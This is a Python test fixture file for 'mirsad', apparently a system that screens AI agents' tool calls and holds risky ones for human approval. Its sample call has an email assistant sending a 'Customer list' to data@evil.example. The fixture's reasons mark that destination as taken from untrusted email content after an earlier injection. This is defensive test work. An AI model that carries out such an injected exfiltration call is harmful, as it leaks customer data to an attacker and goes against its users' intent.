from __future__ import annotations

import pytest

from mirsad.approvals import ApprovalService, Notifier
from mirsad.audit import AuditLog
from mirsad.models import Action, Decision, Reason, Risk, SinkKind, ToolCall
from mirsad.storage import Database

HMAC_KEY = b"test-audit-key-0123456789abcdef0123456789"


@pytest.fixture
def db(tmp_path) -> Database:
    database = Database(f"sqlite:///{tmp_path / 'mirsad.db'}")
    database.create_all()
    yield database
    database.dispose()


@pytest.fixture
def audit(db) -> AuditLog:
    return AuditLog(db, HMAC_KEY)


@pytest.fixture
def notifier() -> Notifier:
    return Notifier()


@pytest.fixture
def service(db, notifier) -> ApprovalService:
    return ApprovalService(db, notifier, timeout_s=30, org_name="Najd Trading Co.")


def make_call(**overrides) -> ToolCall:
    data = {
        "call_id": "call_send_1",
        "session_id": "sess-1",
        "agent_id": "email-crm-assistant",
        "tool": "send_email",
        "arguments": {"to": "data@evil.example", "subject": "Customer list", "body": "See attached."},
    }
    data.update(overrides)
    return ToolCall(**data)


def make_decision(call: ToolCall | None = None, *, action: Action = Action.REQUIRE_APPROVAL,
                  reasons: list[Reason] | None = None, risk: Risk = Risk.CRITICAL) -> Decision:
    call = call or make_call()
    if reasons is None:
        reasons = [
            Reason(layer="taint", code="TAINT_UNTRUSTED_DESTINATION", action=Action.REQUIRE_APPROVAL,
                   message="Destination came from untrusted content", risk_score=0.9,
                   evidence={"param": "to", "value": "data@evil.example", "source_tool": "read_email",
                             "source_call_id": "call_read_1", "source_ref": "E-1042", "field": "body"}),
            Reason(layer="taint", code="TAINT_AFTER_INJECTION", action=Action.REQUIRE_APPROVAL,
                   message="Injection detected earlier", risk_score=0.8, evidence={"tool_risk": "medium"}),
            Reason(layer="policy", code="TOOL_RISK", action=Action.ALLOW, message="risk", risk_score=0.3),
        ]
    return Decision(call_id=call.call_id, action=action, reasons=reasons, risk=risk, risk_score=0.9,
                    sink=SinkKind.EXTERNAL, policy_version="v1")
